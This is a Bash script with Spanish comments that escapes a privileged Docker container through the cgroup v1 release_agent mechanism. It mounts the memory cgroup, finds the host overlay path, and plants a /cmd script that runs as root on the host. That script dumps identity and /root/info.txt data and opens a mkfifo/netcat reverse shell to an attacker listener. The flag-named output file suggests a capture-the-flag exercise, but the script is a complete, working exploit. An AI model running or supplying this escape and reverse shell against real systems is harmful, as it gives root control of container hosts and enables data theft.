#!/bin/bash
# Docker privileged container escape via cgroup v1 release_agent.
# Colocar como /root/start.sh (entrypoint reescribible) del contenedor.
# Al reiniciar el contenedor corre como root y escapa al host.
# IMPORTANTE: usar subsistema 'memory' (rdma/cpu NO soportan release_agent).
# MYIP/LPORT: tu listener. host_path = directorio del overlay diff tal como lo ve el host.
exec >> /tmp/esc_debug.log 2>&1
echo "=== esc $(date) uid=$(id) ==="
MYIP="${MYIP:-192.168.140.107}"
LPORT="${LPORT:-5555}"

mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && echo "mount=$?"
mkdir -p /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && echo "notify=$?"

# host_path: path del overlay diff (visible igual desde el host)
host_path=$(sed -n 's/.*perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "hp=$host_path"

echo "$host_path/cmd" > /tmp/cgrp/release_agent && echo "ra=$?"

# /cmd corre como root en el HOST. Volcar datos + reverse shell.
printf '#!/bin/sh\nid > %s/hostid.txt 2>&1\ncat /root/info.txt > %s/OUTSIDEFLAG_DO_NOT_DELETE 2>&1\nrm -f /tmp/hf;mkfifo /tmp/hf;cat /tmp/hf|/bin/sh -i 2>&1|nc %s %s >/tmp/hf\n' "$host_path" "$host_path" "$MYIP" "$LPORT" > /cmd
chmod 777 /cmd
cat /cmd

# Disparar: el proceso que escribe su PID debe TERMINAR para vaciar el cgroup.
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs" && echo "trig=$?"
sleep 3
